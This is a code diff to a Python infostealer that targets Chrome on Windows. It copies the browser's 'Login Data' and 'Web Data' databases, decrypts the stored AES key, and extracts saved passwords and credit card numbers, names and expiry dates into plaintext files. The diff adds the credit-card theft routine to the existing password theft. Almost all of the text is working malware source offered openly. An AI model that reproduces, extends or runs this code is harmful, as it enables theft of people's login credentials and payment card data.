@@ -5,12 +5,15 @@ import base64
 import sqlite3
 import win32crypt
 from Crypto.Cipher import AES
+from hashlib import pbkdf2_hmac
 import shutil
 
+__CHROME_PATH_LOCAL_STATE              = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
+__CHROME_CREDS_ORIGINAL_FILE           = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data"%(os.environ['USERPROFILE']))
+__CHROME_CREDS_COPY_FILE               = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data.bak"%(os.environ['USERPROFILE']))
+__CHROME_CREDIT_CARDS_FILE             = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Web Data"%(os.environ['USERPROFILE']))
+__CHROME_CREDIT_CARDS_COPY_FILE        = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Web Data.bak"%(os.environ['USERPROFILE']))
 
-__ORIGINAL_FILE           = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data"%(os.environ['USERPROFILE']))
-__COPY_FILE               = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data.bak"%(os.environ['USERPROFILE']))
-__CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
 
 
 def __decrypt_payload(cipher, payload):
@@ -34,7 +37,7 @@ def __get_secret_key():
         return None
 
 
-def __decrypt_password(ciphertext, secret_key):
+def __decrypt_chrome_encryption(ciphertext, secret_key):
     try:
         initialisation_vector = ciphertext[3:15] # Initialisation vector for AES decryption
         encrypted_password = ciphertext[15:-16] # Get encrypted password by removing suffix bytes (last 16 bits), encrypted password is 192 bits
@@ -46,16 +49,16 @@ def __decrypt_password(ciphertext, secret_key):
         return ""
 
 
-def __copy_db_file():
+def __copy_db_file(ORIGINAL_FILE, COPY_FILE):
     try:
-        shutil.copyfile(__ORIGINAL_FILE, __COPY_FILE) # Copy file to prevent DB locking
+        shutil.copyfile(ORIGINAL_FILE, COPY_FILE) # Copy file to prevent DB locking
     except Exception as e:
         print(e)
 
 
-def __open_db_connection():
+def __open_db_connection(FILE):
     try:
-        con = sqlite3.connect(__COPY_FILE) # Create an SQL connection to our SQLite database
+        con = sqlite3.connect(FILE) # Create an SQL connection to our SQLite database
         cur = con.cursor()
         return con, cur
     except Exception as e:
@@ -72,13 +75,29 @@ def __get_chrome_creds(cur):
         if re.match(r"^android\:", origin_url): # remove unrelevent android data
             continue
 
-        decrypted_password = __decrypt_password(enc_password, secret_key)
+        decrypted_password = __decrypt_chrome_encryption(enc_password, secret_key)
         chrome_creds.append({"origin_url": origin_url, "username": username, "password": decrypted_password})
     return chrome_creds
 
 
+def __get_chrome_credit_cards(cur):
+    secret_key = __get_secret_key() # Get secret key to decrypt chrome passwords
+    credit_cards = []
+    for row in cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, nickname FROM credit_cards"): # Get, decode and output SQLite DB values to other file
+        name_on_card, expiration_month, expiration_year, card_number_encrypted, nickname = row[0], row[1], row[2], row[3], row[4]
+
+        card_number_decrypted = __decrypt_chrome_encryption(card_number_encrypted, secret_key)
+        credit_cards.append({"name_on_card": name_on_card,
+                            "expiration_month": expiration_month,
+                            "expiration_year": expiration_year,
+                            "card_number_decrypted": card_number_decrypted,
+                            "nickname": nickname
+                            })
+    return credit_cards
+
+
 def __write_chrome_creds(chrome_creds):
-    with open(__COPY_FILE, "w+") as f: # send chrome data to bak file
+    with open(__CHROME_CREDS_COPY_FILE, "w+") as f: # send chrome data to bak file
         for record in chrome_creds:
             try:
                 f.write(f"{record['origin_url']}, {record['username']}, {record['password']}\n")
@@ -86,9 +105,26 @@ def __write_chrome_creds(chrome_creds):
                 continue
 
 
-def steal_chrome_creds():
-    __copy_db_file() # get chrome credentials
-    con, cur = __open_db_connection()
+def __write_chrome_credit_cards(chrome_credit_cards):
+    with open(__CHROME_CREDIT_CARDS_COPY_FILE, "w+") as f: # send chrome data to bak file
+        for record in chrome_credit_cards:
+            try:
+                f.write(f"{record['name_on_card']}, {record['expiration_month']}, {record['expiration_year']}, {record['card_number_decrypted']}, {record['nickname']}\n")
+            except Exception as e:
+                continue
+
+
+def steal_chrome_creds(): # get chrome credentials
+    __copy_db_file(__CHROME_CREDS_ORIGINAL_FILE, __CHROME_CREDS_COPY_FILE)
+    con, cur = __open_db_connection(__CHROME_CREDS_COPY_FILE)
     chrome_creds = __get_chrome_creds(cur)
     con.close() # Close SQLite3 connection
     __write_chrome_creds(chrome_creds)
+
+
+def steal_chrome_credit_cards_info(): # get chrome credit cards
+    __copy_db_file(__CHROME_CREDIT_CARDS_FILE, __CHROME_CREDIT_CARDS_COPY_FILE)
+    con, cur = __open_db_connection(__CHROME_CREDIT_CARDS_COPY_FILE)
+    credit_cards = __get_chrome_credit_cards(cur)
+    con.close() # Close SQLite3 connection
+    __write_chrome_credit_cards(credit_cards)
